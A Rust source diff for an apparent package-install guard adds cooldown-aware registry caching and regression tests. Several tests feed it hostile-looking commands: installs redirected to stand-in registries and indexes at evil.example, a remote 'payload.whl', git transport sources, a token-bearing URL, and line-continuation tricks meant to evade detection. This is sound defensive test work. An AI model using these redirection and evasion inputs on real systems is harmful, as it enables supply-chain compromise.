-        // Always query the full /<pkg> doc since per-version endpoints
-        // don't expose publish times.
-        let url = format!("https://registry.npmjs.org/{}", urlencoding(pkg));
-        let v = http_get_json(&url)?;
-        let resolved = match pinned {
-            Some(ver) => ver.to_string(),
-            None => v
-                .pointer("/dist-tags/latest")
+    let ((resolved, publish), refresh_cache) =
+        revalidate_cached_metadata(cached_hint, cooldown_days, || {
+            // Always query the full /<pkg> doc since per-version endpoints
+            // don't expose publish times.
+            let url = format!("https://registry.npmjs.org/{}", urlencoding(pkg));
+            let v = http_get_json(&url)?;
+            let resolved = match pinned {
+                Some(ver) => ver.to_string(),
+                None => v
+                    .pointer("/dist-tags/latest")
+                    .and_then(|x| x.as_str())
+                    .ok_or_else(|| "no dist-tags/latest".to_string())?
+                    .to_string(),
+            };
+            let ts = v
+                .pointer(&format!("/time/{}", resolved))
                 .and_then(|x| x.as_str())
-                .ok_or_else(|| "no dist-tags/latest".to_string())?
-                .to_string(),
-        };
-        let ts = v
-            .pointer(&format!("/time/{}", resolved))
-            .and_then(|x| x.as_str())
-            .ok_or_else(|| format!("no publish time for version {}", resolved))?;
-        let publish = parse_iso8601(ts)?;
-        Ok((resolved, publish))
-    })?;
+                .ok_or_else(|| format!("no publish time for version {}", resolved))?;
+            let publish = parse_iso8601(ts)?;
+            Ok((resolved, publish))
+        })?;
     if refresh_cache {
         cache_put(Ecosystem::Npm, &cache_key, &resolved, &publish);
     }
     Ok((resolved, publish))
 }
 
-fn pypi_metadata(pkg: &str, pinned: Option<&str>) -> Result<PackageMetadata, String> {
+fn pypi_metadata(
+    pkg: &str,
+    pinned: Option<&str>,
+    cooldown_days: u32,
+) -> Result<PackageMetadata, String> {
     let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
     let cached_hint = cache_get(Ecosystem::Pypi, &cache_key);
-    let ((resolved, publish), refresh_cache) = revalidate_cached_metadata(cached_hint, || {
-        // When pinned, use the version-specific endpoint (smaller
-        // response). Otherwise discover info.version first.
-        if let Some(ver) = pinned {
-            let url = format!(
-                "https://pypi.org/pypi/{}/{}/json",
-                urlencoding(pkg),
-                urlencoding(ver)
-            );
+    let ((resolved, publish), refresh_cache) =
+        revalidate_cached_metadata(cached_hint, cooldown_days, || {
+            // When pinned, use the version-specific endpoint (smaller
+            // response). Otherwise discover info.version first.
+            if let Some(ver) = pinned {
+                let url = format!(
+                    "https://pypi.org/pypi/{}/{}/json",
+                    urlencoding(pkg),
+                    urlencoding(ver)
+                );
+                let v = http_get_json(&url)?;
+                let urls = v
+                    .get("urls")
+                    .and_then(|x| x.as_array())
+                    .ok_or_else(|| "no urls in pypi response".to_string())?;
+                let first = urls.first().ok_or_else(|| "empty urls list".to_string())?;
+                let ts = first
+                    .get("upload_time_iso_8601")
+                    .or_else(|| first.get("upload_time"))
+                    .and_then(|x| x.as_str())
+                    .ok_or_else(|| "no upload_time".to_string())?;
+                return Ok((ver.to_string(), parse_iso8601(ts)?));
+            }
+
+            let url = format!("https://pypi.org/pypi/{}/json", urlencoding(pkg));
             let v = http_get_json(&url)?;
-            let urls = v
-                .get("urls")
+            let latest = v
+                .pointer("/info/version")
+                .and_then(|x| x.as_str())
+                .ok_or_else(|| "no info/version".to_string())?
+                .to_string();
+            let arr = v
+                .pointer(&format!("/releases/{}", latest))
                 .and_then(|x| x.as_array())
-                .ok_or_else(|| "no urls in pypi response".to_string())?;
-            let first = urls.first().ok_or_else(|| "empty urls list".to_string())?;
+                .ok_or_else(|| "no releases".to_string())?;
+            let first = arr.first().ok_or_else(|| "empty releases".to_string())?;
             let ts = first
                 .get("upload_time_iso_8601")
                 .or_else(|| first.get("upload_time"))
                 .and_then(|x| x.as_str())
                 .ok_or_else(|| "no upload_time".to_string())?;
-            return Ok((ver.to_string(), parse_iso8601(ts)?));
-        }
-
-        let url = format!("https://pypi.org/pypi/{}/json", urlencoding(pkg));
-        let v = http_get_json(&url)?;
-        let latest = v
-            .pointer("/info/version")
-            .and_then(|x| x.as_str())
-            .ok_or_else(|| "no info/version".to_string())?
-            .to_string();
-        let arr = v
-            .pointer(&format!("/releases/{}", latest))
-            .and_then(|x| x.as_array())
-            .ok_or_else(|| "no releases".to_string())?;
-        let first = arr.first().ok_or_else(|| "empty releases".to_string())?;
-        let ts = first
-            .get("upload_time_iso_8601")
-            .or_else(|| first.get("upload_time"))
-            .and_then(|x| x.as_str())
-            .ok_or_else(|| "no upload_time".to_string())?;
-        Ok((latest, parse_iso8601(ts)?))
-    })?;
+            Ok((latest, parse_iso8601(ts)?))
+        })?;
     if refresh_cache {
         cache_put(Ecosystem::Pypi, &cache_key, &resolved, &publish);
     }
@@ -2708,7 +3010,11 @@ struct CacheEntry {
 
 fn cache_get(eco: Ecosystem, pkg: &str) -> Option<(String, DateTime<Utc>)> {
     let path = cache_file(eco, pkg)?;
-    let content = fs::read_to_string(&path).ok()?;
+    cache_get_at(&path)
+}
+
+fn cache_get_at(path: &std::path::Path) -> Option<PackageMetadata> {
+    let content = fs::read_to_string(path).ok()?;
     let entry: CacheEntry = serde_json::from_str(&content).ok()?;
     let fetched = parse_iso8601(&entry.fetched_at).ok()?;
     if (Utc::now() - fetched) > ChronoDuration::hours(24) {
@@ -2910,8 +3216,8 @@ fn check_with_config(cmd: &str, config: &Config) -> Verdict {
 
             // Age check against (resolved or pinned) version
             let registry_result = match install.ecosystem {
-                Ecosystem::Npm => npm_metadata(&pkg, pinned.as_deref()),
-                Ecosystem::Pypi => pypi_metadata(&pkg, pinned.as_deref()),
+                Ecosystem::Npm => npm_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
+                Ecosystem::Pypi => pypi_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
                 // Defensive: Unknown installs always have `unvettable:
                 // Some(...)` + empty packages, so this loop body never
                 // runs for them. If a future code path constructs an
@@ -5025,7 +5331,7 @@ mod tests {
     #[test]
     fn shell_tokens_strips_single_quotes() {
         // Direct tokeniser unit test: `'npm'` -> token text `npm`.
-        let toks = shell_tokens(r#"'npm' install"#);
+        let toks = shell_tokens(r#"'npm' install"#).expect("balanced shell words");
         assert_eq!(toks.len(), 2);
         assert_eq!(toks[0].1, "npm");
         assert_eq!(toks[1].1, "install");
@@ -5033,7 +5339,7 @@ mod tests {
 
     #[test]
     fn shell_tokens_strips_double_quotes() {
-        let toks = shell_tokens(r#""pip" install"#);
+        let toks = shell_tokens(r#""pip" install"#).expect("balanced shell words");
         assert_eq!(toks.len(), 2);
         assert_eq!(toks[0].1, "pip");
         assert_eq!(toks[1].1, "install");
@@ -5044,7 +5350,7 @@ mod tests {
         // Regression guard: the operator-splitting behaviour must survive
         // for unquoted regions. `npm install x && echo y` must still split
         // the `&&` as its own token.
-        let toks = shell_tokens("npm install x && echo y");
+        let toks = shell_tokens("npm install x && echo y").expect("balanced shell words");
         let ops: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
         assert!(
             ops.contains(&"&&"),
@@ -5056,7 +5362,7 @@ mod tests {
     #[test]
     fn shell_tokens_keeps_operators_inside_quotes_attached() {
         // `'a && b'` is one token whose text is `a && b`.
-        let toks = shell_tokens(r#"foo 'a && b' bar"#);
+        let toks = shell_tokens(r#"foo 'a && b' bar"#).expect("balanced shell words");
         let texts: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
         assert!(
             texts.iter().any(|t| t.contains("&&")),
@@ -5565,7 +5871,7 @@ mod tests {
         );
         let authoritative = ("9.9.9".to_string(), Utc::now());
         let fetched = std::cell::Cell::new(false);
-        let (selected, refresh) = revalidate_cached_metadata(Some(forged), || {
+        let (selected, refresh) = revalidate_cached_metadata(Some(forged), 3, || {
             fetched.set(true);
             Ok(authoritative.clone())
         })
@@ -5579,29 +5885,317 @@ mod tests {
         assert!(refresh);
     }
 
+    #[test]
+    fn round_2_cache_hit_is_used_only_when_it_cannot_justify_allow() {
+        let recent = ("1.2.3".to_string(), Utc::now() - ChronoDuration::hours(1));
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(Some(recent.clone()), 3, || {
+            fetched.set(true);
+            Err("recent cache should short-circuit to the cooldown block".to_string())
+        })
+        .expect("recent cached metadata");
+        assert!(!fetched.get());
+        assert_eq!(selected, recent);
+        assert!(!refresh);
+
+        let allow_capable = ("1.2.3".to_string(), Utc::now() - ChronoDuration::days(30));
+        let authoritative = ("1.2.4".to_string(), Utc::now());
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(Some(allow_capable), 3, || {
+            fetched.set(true);
+            Ok(authoritative.clone())
+        })
+        .expect("allow-capable cache must be revalidated");
+        assert!(fetched.get());
+        assert_eq!(selected, authoritative);
+        assert!(refresh);
+    }
+
+    #[test]
+    fn round_2_missing_or_stale_cache_hint_fetches_authoritative_metadata() {
+        let authoritative = ("2.0.0".to_string(), Utc::now());
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(None, 3, || {
+            fetched.set(true);
+            Ok(authoritative.clone())
+        })
+        .expect("missing cache must fetch");
+        assert!(fetched.get());
+        assert_eq!(selected, authoritative);
+        assert!(refresh);
+    }
+
+    #[test]
+    fn round_2_cache_ttl_rejects_stale_disk_entry() {
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let path = dir.path().join("pypi-stale.json");
+        let stale = CacheEntry {
+            version: "1.0.0".to_string(),
+            publish_time: (Utc::now() - ChronoDuration::days(30)).to_rfc3339(),
+            fetched_at: (Utc::now() - ChronoDuration::hours(25)).to_rfc3339(),
+        };
+        cache_put_at(&path, &stale).expect("stale cache fixture");
+        assert!(cache_get_at(&path).is_none(), "stale cache must be ignored");
+    }
+
+    #[test]
+    fn round_2_repeated_short_verbosity_flags_are_exact() {
+        assert!(manager_option_is_boolean("pip", "-vvv"));
+        assert!(manager_option_is_boolean("pip", "-qq"));
+        assert!(manager_option_is_boolean("uv", "-vv"));
+        assert!(!manager_option_is_boolean("pip", "-version"));
+        assert!(!manager_option_is_boolean("pip", "-qxz"));
+    }
+
+    #[test]
+    fn round_2_attached_value_option_is_not_a_package() {
+        let command = "npm install --cache=/tmp/npm-cache left-pad";
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1);
+        assert_eq!(names(&installs[0]), vec!["left-pad"]);
+        assert!(installs[0].unvettable.is_none());
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config(command, &config),
+            Verdict::Allow
+        ));
+    }
+
     #[cfg(unix)]
     #[test]
     fn issue_231_cache_replacement_is_private() {
         use std::os::unix::fs::PermissionsExt;
 
         let dir = tempfile::TempDir::new().expect("tempdir");
-        let path = dir.path().join("npm-example.json");
-        fs::write(&path, b"attacker controlled").expect("seed cache");
-        fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
-            .expect("seed permissive mode");
         let entry = CacheEntry {
             version: "1.0.0".to_string(),
             publish_time: "2026-01-01T00:00:00Z".to_string(),
             fetched_at: "2026-01-02T00:00:00Z".to_string(),
         };
 
-        cache_put_at(&path, &entry).expect("private cache write");
-        let mode = fs::metadata(&path)
-            .expect("cache metadata")
-            .permissions()
-            .mode()
-            & 0o777;
-        assert_eq!(mode, 0o600);
+        // npm_metadata and pypi_metadata both route through cache_put ->
+        // cache_put_at -> write_private_atomic. Exercise both cache filename
+        // shapes so #231 cannot regress on only one ecosystem.
+        for cache_name in ["npm-example.json", "pypi-example.json"] {
+            let path = dir.path().join(cache_name);
+            fs::write(&path, b"attacker controlled").expect("seed cache");
+            fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
+                .expect("seed permissive mode");
+
+            cache_put_at(&path, &entry).expect("private cache write");
+            let mode = fs::metadata(&path)
+                .expect("cache metadata")
+                .permissions()
+                .mode()
+                & 0o777;
+            assert_eq!(mode, 0o600, "private replacement mode for {cache_name}");
+        }
+    }
+
+    fn round_2_allowlisted_config(packages: &[&str]) -> Config {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        config
+            .overrides
+            .always_allow
+            .extend(packages.iter().map(|package| (*package).to_string()));
+        config
+    }
+
+    #[test]
+    fn round_2_manager_name_line_continuations_are_joined_before_tokenising() {
+        for command in ["npm\\\n install evil", "npm\\\r\n install evil"] {
+            let installs = detect_installs(command);
+            assert_eq!(
+                installs.len(),
+                1,
+                "continued manager must be detected: {command:?}"
+            );
+            assert_eq!(names(&installs[0]), vec!["evil"]);
+        }
+    }
+
+    #[test]
+    fn round_2_line_continuation_does_not_swallow_a_later_command_boundary() {
+        let installs = detect_installs("npm\\\n\ninstall evil");
+        assert!(
+            installs.is_empty(),
+            "only the escaped newline is joined; the following bare newline remains a boundary: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_2_registry_and_config_switches_fail_closed() {
+        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+        for command in [
+            "npm install --registry=https://evil.example left-pad",
+            "npm install --userconfig /tmp/evil.npmrc left-pad",
+            "npm install --globalconfig=/tmp/evil.npmrc left-pad",
+            "npm -C /tmp/project install left-pad",
+            "pip install --index-url=https://evil.example/simple requests",
+            "uv --index-url https://evil.example/simple pip install requests",
+        ] {
+            let installs = detect_installs(command);
+            assert!(
+                installs.iter().any(|install| install.unvettable.is_some()),
+                "registry/config selection must be unvettable: {command:?} -> {installs:?}"
+            );
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Ask(_)),
+                "an allowlisted name must not bypass registry/config uncertainty: {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_2_explicit_default_registry_remains_allowable() {
+        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+        assert!(matches!(
+            check_with_config(
+                "npm install --registry=https://registry.npmjs.org left-pad",
+                &config
+            ),
+            Verdict::Allow
+        ));
+        assert!(matches!(
+            check_with_config(
+                "pip install --index-url=https://pypi.org/simple requests",
+                &config
+            ),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_2_quoted_remote_url_is_unvettable() {
+        let installs = detect_installs(r#"pip install "https://evil.example/payload.whl""#);
+        assert_eq!(installs.len(), 1);
+        assert!(installs[0].unvettable.is_some());
+        assert!(installs[0].packages.is_empty());
+    }
+
+    #[test]
+    fn round_2_scp_and_git_transport_sources_are_unvettable_and_redacted() {
+        let scp = detect_installs(
+            r#"pip install "git@github.com:owner/repo.git?token=round2-supersecret""#,
+        );
+        assert_eq!(scp.len(), 1);
+        let rendered = format!("{scp:?}");
+        assert!(scp[0].unvettable.is_some());
+        assert!(scp[0].packages.is_empty());
+        assert!(
+            !rendered.contains("round2-supersecret"),
+            "secret leaked: {rendered}"
+        );
+        assert!(!rendered.contains("git@"), "userinfo leaked: {rendered}");
+
+        for source in [
+            "git+http://evil.example/repo.git",
+            "git+https://evil.example/repo.git",
+            "git+ssh://git@evil.example/repo.git",
+        ] {
+            let installs = detect_installs(&format!("pip install {source}"));
+            assert_eq!(installs.len(), 1, "missing transport: {source}");
+            assert!(installs[0].unvettable.is_some(), "source escaped: {source}");
+        }
+    }
+
+    #[test]
+    fn round_2_tokenisation_failure_is_unvettable() {
+        let installs = detect_installs("npm install left-pad # unclosed 'quote");
+        assert!(
+            installs.iter().any(|install| {
+                install
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("token"))
+            }),
+            "unparseable install command must fail closed: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_2_common_boolean_flags_preserve_benign_allow() {
+        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+        for command in [
+            "npm --save install left-pad",
+            "npm --save-dev install left-pad",
+            "npm --production install left-pad",
+            "pnpm --frozen-lockfile install left-pad",
+            "pip --user install requests",
+            "pip -U install requests",
+            "pip --upgrade install requests",
+            "pip --pre install requests",
+            "pip --no-deps install requests",
+            "pip --verbose install requests",
+            "pip --quiet install requests",
+            "pip -vv install requests",
+            "pip -qq install requests",
+            "uv --verbose pip install requests",
+            "uv --quiet pip install requests",
+        ] {
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Allow),
+                "benign boolean option over-blocked: {command:?} -> {:?}",
+                detect_installs(command)
+            );
+        }
+    }
+
+    #[test]
+    fn round_2_scanner_continues_after_flag_shaped_option_value() {
+        let command = "npm --cache --install install left-pad";
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1, "real verb after option value was missed");
+        assert_eq!(names(&installs[0]), vec!["left-pad"]);
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config(command, &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_2_missing_editable_target_fails_closed() {
+        let installs = detect_installs("pip install -e");
+        assert_eq!(installs.len(), 1);
+        assert!(!installs[0].has_editable);
+        assert!(installs[0].unvettable.is_some());
+
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        assert!(matches!(
+            check_with_config("pip install -e", &config),
+            Verdict::Ask(_)
+        ));
+    }
+
+    #[test]
+    fn round_2_y2k_boundary_is_accepted() {
+        assert!(parse_iso8601("2000-01-01T00:00:00Z").is_ok());
+        assert!(parse_iso8601("1999-12-31T23:59:59Z").is_err());
+    }
+
+    #[test]
+    fn round_2_conda_channel_uses_the_conda_caveat() {
+        let installs = detect_installs("conda install -c conda-forge numpy");
+        assert_eq!(installs.len(), 1);
+        let detail = installs[0]
+            .unvettable
+            .as_deref()
+            .expect("conda installs are unvettable against PyPI");
+        assert!(detail.contains("conda channels"));
+        assert!(!detail.contains("requirements/constraints"));
+    }
+
+    #[test]
+    fn round_2_process_substitution_errors_fail_closed() {
+        let malformed = detect_installs("cat <(npm install evil");
+        assert!(malformed.iter().any(|install| install.unvettable.is_some()));
+
+        let over_limit = format!("cat <({})", "x".repeat(65 * 1024));
+        let installs = detect_installs(&over_limit);
+        assert!(installs.iter().any(|install| install.unvettable.is_some()));
     }
 
     #[cfg(unix)]
